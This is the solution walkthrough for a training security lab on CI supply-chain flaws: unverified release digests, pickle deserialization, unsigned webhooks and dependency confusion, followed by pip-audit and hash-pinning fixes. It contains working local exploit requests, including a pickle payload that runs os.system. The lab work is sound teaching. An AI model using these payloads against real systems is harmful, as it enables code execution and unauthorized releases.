🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)

# A03 — Solution (spoilers!)

Try the lab yourself first, using the hints from the [README](./README.md).

## Part 1. The four defects of the Kestrel CI site

All requests below are for the vulnerable version (port 8021). The fixed version (8022) must reject them; what exactly changes is described at the end.

### Defect 1. The artifact digest is never recomputed, the signature is never checked

```bash
curl -s -X POST http://127.0.0.1:8021/api/releases \
  -H 'Content-Type: application/json' \
  -d '{"name": "app", "version": "2.14.0",
       "digest": "0000000000000000000000000000000000000000000000000000000000000000",
       "artifact": "app-2.14.0"}'
```

Response:

```json
{"ok": true, "message": "Release published without a signature",
 "detail": "The digest was taken from the request as is ...",
 "flag": "FLAG{a03_unverified_release}"}
```

The server took the digest from the request, never computed SHA-256 over the artifact body and never compared the signature with anything. Put any value into `signature` and the answer becomes `Release published, signature ignored` — the signature itself changes nothing. You can see the same thing in a browser: the form on `/builds` is pre-filled with a mismatching digest, press "Publish release".

Why it matters: the digest and the signature are the only link between an artifact and the commit it was built from. When they are taken on faith, the build (or anyone who got hold of its token) can put anything into the registry under any name and any digest.

### Defect 2. The build profile is deserialized with pickle

Build the blob and send it:

```bash
python - <<'PY'
import base64, os, pickle

class Profile:
    def __reduce__(self):
        return (os.system, ("id",))

print(base64.b64encode(pickle.dumps(Profile())).decode())
PY
```

```bash
curl -s -X POST http://127.0.0.1:8021/api/builds/run \
  -H 'Content-Type: application/json' \
  -d '{"profile": "<the base64 from above>"}'
```

Response: `{"message": "Build finished from a serialized profile", "flag": "FLAG{a03_insecure_deserialization}"}`. The output of `id` appears in the terminal where the lab runs: `pickle.loads` executes code **while parsing**, before the server reads the first field of the profile. No error is raised — from the server's point of view this was a successful parse.

A build profile is data, not code. JSON would have been enough.

### Defect 3. The CI webhook is accepted without a signature

```bash
curl -s -X POST http://127.0.0.1:8021/webhooks/ci \
  -H 'Content-Type: application/json' \
  -d '{"event": "release.approve", "build": "#4821", "env": "production"}'
```

Response: `{"message": "Build promoted to production", "flag": "FLAG{a03_unsigned_webhook}"}`. The request carries no `X-Kestrel-Signature` header at all, yet the build was promoted to production. So anyone who knows the address can release to production — for example by sending an event with the number of a build that never passed its checks.

### Defect 4. Package names resolve through both indexes

```bash
curl -s -X POST http://127.0.0.1:8021/api/registry/install \
  -H 'Content-Type: application/json' -d '{"name": "kestrel-utils"}'
```

Response: `Package resolved from the public mirror`, flag `FLAG{a03_dependency_confusion}`. Internally `kestrel-utils` exists as `1.4.2`; the public mirror has the same `1.4.2` from an unknown publisher plus a `9.9.9`. The resolver reads both indexes, takes the newest version and never compares a digest, so the build installs somebody else's package.

Repeat with a pinned version:

```bash
curl -s -X POST http://127.0.0.1:8021/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "kestrel-utils", "version": "1.4.2"}'
```

The answer again mentions the public mirror: with the same version in both indexes the public one wins. Hence the conclusion: **pinning a version is not enough**, you also need the digest from the lock file. For comparison, a package that the public mirror does not have:

```bash
curl -s -X POST http://127.0.0.1:8021/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "kestrel-report", "version": "0.9.7"}'
```

Here the answer is normal: `Package installed from the internal index`.

### What the fixed version does

| Defect | vulnerable | fixed |
|--------|-----------|-------|
| 1. Release | accepts any digest and signature | computes SHA-256 over `artifact` itself, compares it with `digest` → `400 Digest mismatch`; then verifies the HMAC-SHA256 of the digest with the project key → `400 Signature missing or invalid` |
| 2. Profile | `pickle.loads` | `json.loads` only; a blob → `400 Profile not accepted` |
| 3. Webhook | the signature is never checked | computes the HMAC-SHA256 of the **request body** and compares it with `X-Kestrel-Signature` using `hmac.compare_digest` → without it `403 Signature required` |
| 4. Packages | both indexes, no digest check | internal index only, the version must be pinned, the digest is compared with the lock file |

Checking a release against the fixed version (digest and signature computed correctly):

```bash
python - <<'PY'
import hashlib, hmac, json, urllib.request

KEY = "kestrel-lab-project-key"
artifact = "app-2.14.0"
digest = hashlib.sha256(artifact.encode()).hexdigest()
signature = hmac.new(KEY.encode(), digest.encode(), "sha256").hexdigest()

payload = {"name": "app", "version": "2.14.0", "digest": digest,
           "signature": signature, "artifact": artifact}
request = urllib.request.Request(
    "http://127.0.0.1:8022/api/releases",
    data=json.dumps(payload).encode(),
    headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(request).read().decode())
PY
```

Response: `{"ok": true, "message": "Release published"}`. Change `artifact` in the script without changing `digest` and you get `400 Digest mismatch`; keep the digest but sign with another key and you get `400 Signature missing or invalid`.

Checking a signed webhook:

```bash
python - <<'PY'
import hashlib, hmac, json, urllib.request

KEY = "kestrel-lab-project-key"
body = json.dumps({"event": "release.approve", "build": "#4821"}).encode()
signature = hmac.new(KEY.encode(), body, "sha256").hexdigest()

request = urllib.request.Request(
    "http://127.0.0.1:8022/webhooks/ci", data=body,
    headers={"Content-Type": "application/json",
             "X-Kestrel-Signature": "sha256=" + signature})
print(urllib.request.urlopen(request).read().decode())
PY
```

Response: `{"message": "Signature verified"}`. The signature is computed over the **exact bytes of the body**: another body or another key gives `403`.

Checking the registry against the fixed version:

```bash
# no version: pinning is mandatory
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' -d '{"name": "kestrel-utils"}'
# -> 400 Version not pinned

# a pinned version: internal index only, matching digest
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "kestrel-utils", "version": "1.4.2"}'
# -> 200 Package installed from the internal index

# the package digest in the index does not match the lock file (acme-auth 1.8.1 here)
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' \
  -d '{"name": "acme-auth", "version": "1.8.1"}'
# -> 400 Hash mismatch

# the name only exists in the public mirror
curl -s -X POST http://127.0.0.1:8022/api/registry/install \
  -H 'Content-Type: application/json' -d '{"name": "requests"}'
# -> 404 Public index refused
```

The `acme-auth` case is prepared in the lab on purpose: the package digest in the index differs from the one pinned in the lock file, so you can see that the check actually works instead of everything being accepted.

**The flags:** `FLAG{a03_unverified_release}`, `FLAG{a03_insecure_deserialization}`, `FLAG{a03_unsigned_webhook}`, `FLAG{a03_dependency_confusion}`.

---

## Part 2. Vulnerable dependencies

### Finding vulnerable dependencies

```bash
pip install pip-audit
pip-audit -r vulnerable/requirements.txt --no-deps --disable-pip
```

`--no-deps --disable-pip` are needed because all versions in the file are already pinned and nothing has to be installed for the check.

When the lab was created (October 2026), `pip-audit` finds advisories in **seven** packages:

| Package | Version | How it got into the project |
|---------|---------|-----------------------------|
| Flask | 2.2.2 | directly |
| Werkzeug | 2.2.2 | dependency of Flask |
| Jinja2 | 3.1.2 | dependency of Flask |
| requests | 2.25.1 | directly |
| urllib3 | 1.26.4 | dependency of requests |
| idna | 2.10 | dependency of requests |
| certifi | 2024.8.30 | dependency of requests |

Most of the problems are in **transitive** dependencies: nobody in the project chose them, but they run in production. The exact numbers and identifiers change over time because vulnerability databases keep growing.

### The fix (fixed)

1. The versions are updated: Flask 3.1.3, Werkzeug 3.1.9, Jinja2 3.1.6, requests 2.33.0 (and their dependencies).
2. `requirements.in` lists only the direct dependencies, and `requirements.txt` is generated by `pip-compile` together with all transitive packages and hashes:

   ```bash
   pip install pip-tools
   pip-compile --generate-hashes --strip-extras --output-file=requirements.txt requirements.in
   ```

3. The installation in Docker uses `--require-hashes`: pip refuses to install a package if its contents do not match the hash.

Check:

```bash
pip-audit -r fixed/requirements.txt --no-deps --disable-pip
# No known vulnerabilities found
```

### The hash experiment

```bash
sed 's/--hash=sha256:[0-9a-f]\{64\}/--hash=sha256:0000000000000000000000000000000000000000000000000000000000000000/g' \
  fixed/requirements.txt > tampered.txt
python -m venv /tmp/venv-test
/tmp/venv-test/bin/pip install --require-hashes -r tampered.txt
```

Result: `ERROR: THESE PACKAGES DO NOT MATCH THE HASHES FROM THE REQUIREMENTS FILE ...`, the installation does not happen. This is how pip protects against a package being swapped on its way from the index.

> Do the experiment in a **clean** environment: if the packages are already installed, pip does not download them and does not compare the hashes.

### SBOM

```bash
pip-audit -r fixed/requirements.txt --no-deps --disable-pip -f cyclonedx-json -o sbom.json
```

This produces a list of the project's components in CycloneDX (JSON) format. You can keep it next to a release and compare it with new advisories.

## What else to remember

- A lock file with hashes protects against substitution, but **not** against vulnerabilities: versions still have to be updated.
- Dependency checks should run automatically (for example in CI) and on a schedule.
- Defect 4 from the first part is exactly dependency confusion. The defence is an internal index as the only source plus hashes from the lock file.
